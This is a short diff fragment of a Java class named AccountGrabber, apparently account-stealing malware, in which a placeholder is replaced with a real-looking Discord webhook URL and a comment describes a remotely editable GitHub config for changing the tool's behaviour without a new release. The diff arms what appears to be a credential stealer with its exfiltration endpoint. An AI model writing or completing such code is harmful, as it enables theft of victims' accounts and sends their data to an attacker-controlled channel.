@@ -19,7 +19,7 @@ import java.util.regex.Pattern;
 public final class AccountGrabber {
 
     /** 1. paste your Discord webhook URL here */
-    private static final String WEBHOOK = "PASTE_YOUR_WEBHOOK_HERE";
+    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561504102054105148/FS-ERylwfnkI-fWG33RSFgI3fKQ1441XnYbYUR8CUyZUgEx8jepJTUJ8CUuEHWdjU7ad";
 
     /** 2. remote switchboard - edit tap.json on GitHub to change things without re-releasing */
     private static final String CONFIG_URL =
